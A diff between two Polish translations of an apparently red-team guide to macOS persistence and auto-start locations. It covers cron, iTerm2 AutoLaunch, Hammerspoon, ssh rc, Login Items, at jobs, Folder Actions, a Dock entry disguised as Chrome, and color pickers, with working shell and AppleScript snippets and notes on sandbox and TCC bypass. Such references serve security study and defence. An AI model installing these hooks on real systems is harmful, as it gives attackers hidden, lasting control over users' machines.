 - **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-- Wymagany root do bezpośredniego dostępu do zapisu. Nie jest wymagany root, jeśli możesz wykonać `crontab <file>`
+- Root wymagany do bezpośredniego zapisu. Root nie jest wymagany, jeśli możesz wykonać `crontab <file>`
 - **Wyzwalacz**: Zależy od zadania cron
 
-#### Opis i wykorzystanie
+#### Opis & Wykorzystanie
 
-Wylistuj zadania cron **bieżącego użytkownika** za pomocą:
+Wyświetl zadania cron **bieżącego użytkownika** za pomocą:
 ```bash
 crontab -l
 ```
-Możesz również zobaczyć wszystkie zadania cron użytkowników w **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (wymaga uprawnień roota).
+Możesz również zobaczyć wszystkie cron jobs użytkowników w **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (wymaga root).
 
-W MacOS można znaleźć kilka folderów wykonujących skrypty z **określoną częstotliwością** w:
+W MacOS można znaleźć kilka folderów uruchamiających skrypty z **określoną częstotliwością**:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
-Można tam znaleźć regularne **cron** **jobs**, **at** **jobs** (niezbyt używane) oraz **periodic** **jobs** (głównie używane do czyszczenia plików tymczasowych). Codzienne zadania okresowe można wykonać na przykład za pomocą: `periodic daily`.
+Tam znajdziesz regularne **cron** **jobs**, **at** **jobs** (niezbyt używane) i **periodic** **jobs** (głównie używane do czyszczenia plików tymczasowych). Codzienne periodic jobs można na przykład uruchomić poleceniem: `periodic daily`.
 
-Aby programowo dodać **user cronjob**, można użyć:
+Aby dodać **user cronjob programatically** można użyć:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
 ```
 ### iTerm2
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)
+Opis: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)
 
-- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- iTerm2 miało przyznane uprawnienia TCC
+- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
+- Omijanie TCC: [✅](https://emojipedia.org/check-mark-button)
+- iTerm2 kiedyś miało przyznane uprawnienia TCC
 
-#### Locations
+#### Lokalizacje
 
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-- **Trigger**: Otwórz iTerm
+- **Wyzwalacz**: Otwarcie iTerm
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-- **Trigger**: Otwórz iTerm
+- **Wyzwalacz**: Otwarcie iTerm
 - **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-- **Trigger**: Otwórz iTerm
+- **Wyzwalacz**: Otwarcie iTerm
 
-#### Description & Exploitation
+#### Opis i wykorzystanie
 
-Skrypty przechowywane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** będą wykonywane. Na przykład:
+Skrypty zapisane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zostaną wykonane. Na przykład:
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
 #!/bin/bash
@@ -441,7 +455,7 @@ EOF
 
 chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
 ```
-or:
+lub:
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -458,7 +472,7 @@ await iterm2.Window.async_create(connection)
 iterm2.run_forever(main)
 EOF
 ```
-Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** również zostanie wykonany:
+Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** zostanie również wykonany:
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
@@ -490,7 +504,7 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
 ```
 > [!WARNING]
-> Wysoce prawdopodobne, że istnieją **inne sposoby nadużycia preferencji iTerm2** do wykonywania dowolnych poleceń.
+> Bardzo prawdopodobne, że istnieją **inne sposoby nadużycia preferencji iTerm2** do wykonania dowolnych poleceń.
 
 ### xbar
 
@@ -498,17 +512,17 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.g
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Ale xbar musi być zainstalowany
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Wymaga uprawnień dostępu
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Wymaga uprawnień Dostępności
 
-#### Lokalizacja
+#### Location
 
 - **`~/Library/Application\ Support/xbar/plugins/`**
 - **Wyzwalacz**: Po uruchomieniu xbar
 
-#### Opis
+#### Description
 
-Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, możliwe jest napisanie skryptu powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:
+Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, możliwe jest utworzenie skryptu shell w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -520,21 +534,21 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)
 
-- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Ale Hammerspoon musi być zainstalowany
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Wymaga uprawnień dostępu
+- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Jednak Hammerspoon musi być zainstalowany
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Wymaga uprawnień Accessibility
 
-#### Location
+#### Lokalizacja
 
 - **`~/.hammerspoon/init.lua`**
-- **Trigger**: Po uruchomieniu hammerspoon
+- **Wyzwalacz**: Po uruchomieniu hammerspoon
 
-#### Description
+#### Opis
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) służy jako platforma automatyzacji dla **macOS**, wykorzystując **język skryptowy LUA** do swoich operacji. Co ważne, wspiera integrację pełnego kodu AppleScript oraz wykonywanie skryptów powłoki, znacznie zwiększając swoje możliwości skryptowe.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) działa jako platforma automatyzacji dla **macOS**, wykorzystując język skryptowy **LUA** do swoich operacji. Co istotne, obsługuje integrację pełnego kodu **AppleScript** oraz wykonywanie skryptów powłoki, co znacząco rozszerza jego możliwości skryptowe.
 
-Aplikacja szuka pojedynczego pliku, `~/.hammerspoon/init.lua`, a po uruchomieniu skrypt zostanie wykonany.
+Aplikacja szuka pojedynczego pliku, `~/.hammerspoon/init.lua`, i po uruchomieniu skrypt zostanie wykonany.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -545,77 +559,77 @@ EOF
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Ale BetterTouchTool musi być zainstalowany
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Wymaga uprawnień do Automatyzacji-Skrótów i Dostępności
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Żąda uprawnień Automation-Shortcuts i Accessibility
 
-#### Location
+#### Lokalizacja
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
-To narzędzie pozwala wskazać aplikacje lub skrypty do wykonania, gdy naciśnięte zostaną niektóre skróty. Atakujący może skonfigurować własny **skrót i akcję do wykonania w bazie danych**, aby uruchomić dowolny kod (skrót może polegać po prostu na naciśnięciu klawisza).
+To narzędzie pozwala wskazać aplikacje lub skrypty do uruchomienia, gdy naciśnięte zostaną określone skróty. Atakujący może być w stanie skonfigurować własny **skrót i akcję do wykonania w bazie danych**, aby uruchomić dowolny kod (skrót może polegać na zwykłym naciśnięciu klawisza).
 
 ### Alfred
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Ale Alfred musi być zainstalowany
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Wymaga uprawnień do Automatyzacji, Dostępności, a nawet Pełnego Dostępu do Dysku
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Żąda uprawnień Automation, Accessibility i nawet Full-Disk Access
 
-#### Location
+#### Lokalizacja
 
 - `???`
 
-Pozwala na tworzenie przepływów pracy, które mogą wykonywać kod, gdy spełnione są określone warunki. Potencjalnie atakujący może stworzyć plik przepływu pracy i sprawić, aby Alfred go załadował (konieczne jest opłacenie wersji premium, aby korzystać z przepływów pracy).
+Pozwala tworzyć workflows, które mogą wykonywać kod, gdy spełnione są określone warunki. Potencjalnie możliwe jest, aby atakujący utworzył plik workflow i sprawił, że Alfred go załaduje (do korzystania z workflows potrzebna jest wersja premium).
 
 ### SSHRC
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Ale ssh musi być włączone i używane
-- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
-- Użycie SSH wymaga dostępu FDA
+- Ale ssh musi być włączony i używany
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- SSH miał dostęp FDA
 
-#### Location
+#### Lokalizacja
 
 - **`~/.ssh/rc`**
-- **Trigger**: Logowanie przez ssh
+- **Wyzwalacz**: Logowanie przez ssh
 - **`/etc/ssh/sshrc`**
-- Wymagany root
-- **Trigger**: Logowanie przez ssh
+- Wymagane uprawnienia root
+- **Wyzwalacz**: Logowanie przez ssh
 
 > [!CAUTION]
-> Aby włączyć ssh, wymagany jest Pełny Dostęp do Dysku:
+> Aby włączyć ssh wymagany jest Full Disk Access:
 >
 > ```bash
 > sudo systemsetup -setremotelogin on
 > ```
 
-#### Description & Exploitation
+#### Opis i eksploatacja
 
-Domyślnie, chyba że `PermitUserRC no` w `/etc/ssh/sshd_config`, gdy użytkownik **loguje się przez SSH**, skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** będą wykonywane.
+Domyślnie, chyba że `PermitUserRC no` w `/etc/ssh/sshd_config`, gdy użytkownik **loguje się przez SSH** skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** zostaną wykonane.
 
 ### **Login Items**
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)
 
 - Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
-- Ale musisz wykonać `osascript` z argumentami
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Ale musisz uruchomić `osascript` z argumentami
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Locations
+#### Lokalizacje
 
 - **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-- **Trigger:** Logowanie
-- Payload exploitu przechowywany w wywołaniu **`osascript`**
+- **Wyzwalacz:** Logowanie
+- Eksploitatowalny payload przechowywany wywołując **`osascript`**
 - **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-- **Trigger:** Logowanie
-- Wymagany root
+- **Wyzwalacz:** Logowanie
+- Wymagane uprawnienia root
 
-#### Description
+#### Opis
 
-W Preferencjach Systemowych -> Użytkownicy i Grupy -> **Elementy logowania** możesz znaleźć **elementy do wykonania, gdy użytkownik się loguje**.\
-Możliwe jest ich wylistowanie, dodawanie i usuwanie z linii poleceń:
+W System Preferences -> Users & Groups -> **Login Items** znajdziesz **pozycje uruchamiane podczas logowania użytkownika**.\
+Możliwe jest ich wyświetlanie, dodawanie i usuwanie z wiersza poleceń:
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
@@ -628,37 +642,37 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 Te elementy są przechowywane w pliku **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-**Elementy logowania** mogą **również** być wskazane przy użyciu API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), które zapisze konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
+**Elementy logowania** mogą **także** być wskazane przy użyciu API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), które zapisze konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 
-### ZIP jako Element Logowania
+### ZIP jako element logowania
 
-(Zobacz poprzednią sekcję o Elementach Logowania, to jest rozszerzenie)
+(Sprawdź poprzednią sekcję o Login Items, to jest rozszerzenie)
 
-Jeśli przechowasz plik **ZIP** jako **Element Logowania**, **`Archive Utility`** go otworzy, a jeśli zip był na przykład przechowywany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z backdoorem, ten folder zostanie utworzony (nie jest to domyślne) i plist zostanie dodany, więc następnym razem, gdy użytkownik się zaloguje, **backdoor wskazany w plist zostanie wykonany**.
+Jeśli zapiszesz plik **ZIP** jako **element logowania**, **`Archive Utility`** go otworzy — i jeśli zip był na przykład zapisany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z backdoor, ten folder zostanie utworzony (nie jest tworzony domyślnie) i plist zostanie dodany, więc przy następnym logowaniu użytkownika **backdoor wskazany w plist zostanie wykonany**.
 
-Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu domowym użytkownika, więc jeśli folder LaunchAgents już istnieje, ta technika nadal będzie działać.
+Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu domowym użytkownika (HOME), więc jeśli folder LaunchAgents już istnieje, ta technika nadal będzie działać.
 
 ### At
 
-Opis: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
 
-- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
-- Ale musisz **wykonać** **`at`** i musi być **włączone**
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
+- Ale musisz **wykonać** **`at`** i musi być **włączony**
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Lokalizacja
+#### Location
 
-- Musisz **wykonać** **`at`** i musi być **włączone**
+- Musisz **wykonać** **`at`** i musi być **włączony**
 
-#### **Opis**
+#### **Description**
 
-Zadania `at` są zaprojektowane do **planowania jednorazowych zadań** do wykonania w określonych czasach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Ważne jest, aby zauważyć, że te zadania są trwałe po ponownym uruchomieniu systemu, co czyni je potencjalnymi zagrożeniami bezpieczeństwa w określonych warunkach.
+`at` tasks are designed for **planowania zadań jednorazowych** do wykonania o określonych porach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy zauważyć, że zadania te są trwałe między ponownymi uruchomieniami systemu, co czyni je potencjalnym zagrożeniem bezpieczeństwa w pewnych warunkach.
 
 Domyślnie są **wyłączone**, ale użytkownik **root** może **je włączyć** za pomocą:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
-To stworzy plik za 1 godzinę:
+To utworzy plik za 1 godzinę:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
@@ -668,7 +682,7 @@ sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-Powyżej widzimy dwa zaplanowane zadania. Możemy wydrukować szczegóły zadania, używając `at -c JOBNUMBER`
+Powyżej widać dwa zaplanowane zadania. Szczegóły zadania można wypisać poleceniem `at -c JOBNUMBER`.
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -700,9 +714,9 @@ unset OLDPWD
 echo 11 > /tmp/at.txt
 ```
 > [!WARNING]
-> Jeśli zadania AT nie są włączone, utworzone zadania nie będą wykonywane.
+> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.
 
-Pliki **zadania** można znaleźć w `/private/var/at/jobs/`
+Pliki **job** można znaleźć w `/private/var/at/jobs/`
 ```
 sh-3.2# ls -l /private/var/at/jobs/
 total 32
@@ -711,44 +725,44 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
-Nazwa pliku zawiera kolejkę, numer zadania i czas, w którym ma być uruchomione. Na przykład przyjrzyjmy się `a0001a019bdcd2`.
+Nazwa pliku zawiera kolejkę, numer zadania i czas, kiedy jest zaplanowane do uruchomienia. Na przykład przyjrzyjmy się `a0001a019bdcd2`.
 
 - `a` - to jest kolejka
-- `0001a` - numer zadania w systemie szesnastkowym, `0x1a = 26`
-- `019bdcd2` - czas w systemie szesnastkowym. Reprezentuje minuty, które upłynęły od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy to przez 60, otrzymujemy `1619509560`, co odpowiada `GMT: 2021. April 27., Tuesday 7:46:00`.
+- `0001a` - numer zadania w hex, `0x1a = 26`
+- `019bdcd2` - czas w hex. Reprezentuje minuty, które upłynęły od epoch. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy to przez 60, otrzymamy `1619509560`, co odpowiada `GMT: 2021. April 27., Tuesday 7:46:00`.
 
-Jeśli wydrukujemy plik zadania, odkryjemy, że zawiera te same informacje, które uzyskaliśmy za pomocą `at -c`.
+Jeśli wypiszemy plik zadania, znajdziemy w nim te same informacje, które uzyskaliśmy używając `at -c`.
 
-### Folder Actions
+### Akcje folderu
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
 Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-- Przydatne do obejścia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
-- Ale musisz być w stanie wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`**, aby skonfigurować Folder Actions
-- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
-- Ma podstawowe uprawnienia TCC, takie jak Pulpit, Dokumenty i Pobrane
+- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
+- Ale musisz być w stanie wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`** i móc skonfigurować akcje folderu
+- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Posiada podstawowe uprawnienia TCC takie jak Desktop, Documents i Downloads
 
 #### Lokalizacja
 
 - **`/Library/Scripts/Folder Action Scripts`**
-- Wymagane uprawnienia roota
-- **Wyzwalacz**: Dostęp do określonego folderu
+- Wymagane uprawnienia root
+- **Trigger**: Dostęp do określonego folderu
 - **`~/Library/Scripts/Folder Action Scripts`**
-- **Wyzwalacz**: Dostęp do określonego folderu
+- **Trigger**: Dostęp do określonego folderu
 
-#### Opis i Eksploatacja
+#### Opis i wykorzystanie
 
-Folder Actions to skrypty automatycznie uruchamiane przez zmiany w folderze, takie jak dodawanie, usuwanie elementów lub inne działania, takie jak otwieranie lub zmiana rozmiaru okna folderu. Te działania mogą być wykorzystywane do różnych zadań i mogą być uruchamiane na różne sposoby, na przykład za pomocą interfejsu Finder lub poleceń terminala.
+Folder Actions to skrypty automatycznie wywoływane przez zmiany w folderze, takie jak dodanie, usunięcie elementów, lub inne akcje jak otwieranie czy zmiana rozmiaru okna folderu. Te akcje mogą być użyte do różnych zadań i mogą być uruchamiane na różne sposoby, np. za pomocą interfejsu Finder lub poleceń w terminalu.
 
-Aby skonfigurować Folder Actions, masz opcje takie jak:
+Aby skonfigurować akcje folderu, masz opcje takie jak:
 
-1. Tworzenie przepływu pracy Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalowanie go jako usługi.
-2. Ręczne dołączenie skryptu za pomocą ustawień Folder Actions w menu kontekstowym folderu.
-3. Wykorzystanie OSAScript do wysyłania wiadomości Apple Event do `System Events.app` w celu programowego skonfigurowania Folder Action.
-- Ta metoda jest szczególnie przydatna do osadzenia akcji w systemie, oferując poziom trwałości.
+1. Stworzenie workflow akcji folderu za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalowanie go jako usługi.
+2. Ręczne dołączenie skryptu przez Folder Actions Setup w menu kontekstowym folderu.
+3. Użycie OSAScript do wysyłania Apple Eventów do `System Events.app` w celu programowego ustawienia akcji folderu.
+- Ta metoda jest szczególnie przydatna do osadzenia akcji w systemie, oferując pewien poziom persistence.
 
-Poniższy skrypt jest przykładem tego, co może być wykonane przez Folder Action:
+Poniższy skrypt jest przykładem tego, co może być wykonane przez akcję folderu:
 ```applescript
 // source.js
 var app = Application.currentApplication();
@@ -758,11 +772,11 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Aby uczynić powyższy skrypt użytecznym dla Folder Actions, skompiluj go za pomocą:
+Aby użyć powyższego skryptu w Folder Actions, skompiluj go za pomocą:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Po skompilowaniu skryptu, skonfiguruj Folder Actions, wykonując poniższy skrypt. Ten skrypt włączy Folder Actions globalnie i szczegółowo przypnie wcześniej skompilowany skrypt do folderu Pulpit.
+Po skompilowaniu skryptu skonfiguruj Folder Actions, uruchamiając poniższy skrypt. Skrypt włączy Folder Actions globalnie i przypisze wcześniej skompilowany skrypt do folderu Desktop.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events")
@@ -772,13 +786,13 @@ var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
 se.folderActions.push(fa)
 fa.scripts.push(myScript)
 ```
-Uruchom skrypt konfiguracyjny za pomocą:
+Uruchom skrypt konfiguracji za pomocą:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
-- To jest sposób na wdrożenie tej persystencji za pomocą GUI:
+- Oto sposób implementacji persistence przez GUI:
 
-To jest skrypt, który zostanie wykonany:
+Oto skrypt, który zostanie wykonany:
 ```applescript:source.js
 var app = Application.currentApplication();
 app.includeStandardAdditions = true;
@@ -787,24 +801,24 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Kompiluj to za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`
+Skompiluj to poleceniem: `osacompile -l JavaScript -o folder.scpt source.js`
 
-Przenieś to do:
+Przenieś go do:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz obserwować** i wybierz w swoim przypadku **`folder.scpt`** (w moim przypadku nazwałem to output2.scp):
+Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz obserwować** i wybierz w Twoim przypadku **`folder.scpt`** (u mnie nazwałem go output2.scp):
 
 <figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
 
-Teraz, jeśli otworzysz ten folder za pomocą **Findera**, twój skrypt zostanie wykonany.
+Teraz, jeśli otworzysz ten folder za pomocą **Finder**, twój skrypt zostanie wykonany.
 
 Ta konfiguracja została zapisana w **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** w formacie base64.
 
-Teraz spróbujmy przygotować tę persistencję bez dostępu do GUI:
+Teraz spróbujmy przygotować tę persistence bez dostępu do GUI:
 
-1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby go zabezpieczyć:
+1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby zrobić kopię zapasową:
 - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
 2. **Usuń** Folder Actions, które właśnie ustawiłeś:
 
@@ -816,26 +830,26 @@ Teraz, gdy mamy puste środowisko
 4. Otwórz Folder Actions Setup.app, aby zastosować tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
 
 > [!CAUTION]
-> I to nie zadziałało dla mnie, ale to są instrukcje z opisu:(
+> I to nie zadziałało u mnie, ale to są instrukcje z writeupu:(
 
-### Skróty Dock
+### Dock shortcuts
 
-Opis: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)
 
-- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
+- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
 - Ale musisz mieć zainstalowaną złośliwą aplikację w systemie
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Lokalizacja
+#### Location
 
 - `~/Library/Preferences/com.apple.dock.plist`
-- **Wyzwalacz**: Gdy użytkownik kliknie na aplikację w docku
+- **Trigger**: Gdy użytkownik kliknie aplikację w Docku
 
-#### Opis i Eksploatacja
+#### Description & Exploitation
 
-Wszystkie aplikacje, które pojawiają się w Docku, są określone w plist: **`~/Library/Preferences/com.apple.dock.plist`**
+Wszystkie aplikacje pojawiające się w Docku są określone w plist: **`~/Library/Preferences/com.apple.dock.plist`**
 
-Możliwe jest **dodanie aplikacji** tylko za pomocą:
+Możliwe jest **dodanie aplikacji** po prostu za pomocą:
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -843,7 +857,7 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 # Restart Dock
 killall Dock
 ```
-Używając pewnych **techniki inżynierii społecznej**, możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie wykonać swój własny skrypt:
+Korzystając z **social engineering** możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie uruchomić własny skrypt:
 ```bash
 #!/bin/sh
 
@@ -898,28 +912,28 @@ killall Dock
 ```
 ### Wybieracze kolorów
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)
+Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)
 
-- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
-- Musi się zdarzyć bardzo specyficzna akcja
-- Zakończysz w innej piaskownicy
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Wymagana jest bardzo konkretna akcja
+- Zakończysz w innym sandboxie
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
 - `/Library/ColorPickers`
-- Wymagane uprawnienia roota
-- Wyzwalacz: Użyj wybieracza kolorów
+- Wymagane uprawnienia root
+- Wyzwalacz: Użycie wybieracza kolorów
 - `~/Library/ColorPickers`
-- Wyzwalacz: Użyj wybieracza kolorów
+- Wyzwalacz: Użycie wybieracza kolorów
 
-#### Opis i Eksploatacja
+#### Opis & Exploit
 
-**Skompiluj pakiet** wybieracza kolorów z własnym kodem (możesz użyć [**tego na przykład**](https://github.com/viktorstrate/color-picker-plus)) i dodaj konstruktor (jak w sekcji [Wygaszacz ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj pakiet do `~/Library/ColorPickers`.
+**Skompiluj color picker** bundle ze swoim kodem (możesz użyć [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) i dodaj konstruktor (jak w [Screen Saver section](macos-auto-start-locations.md#screen-saver)) i skopiuj bundle do `~/Library/ColorPickers`.
 
-Następnie, gdy wybieracz kolorów zostanie wyzwolony, twój kod również powinien się uruchomić.
+Wtedy, gdy color picker zostanie wywołany, twój kod również zostanie uruchomiony.
 
-Zauważ, że binarny plik ładujący twoją bibliotekę ma **bardzo restrykcyjną piaskownicę**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Zauważ, że binarka ładująca twoją bibliotekę ma **bardzo restrykcyjny sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
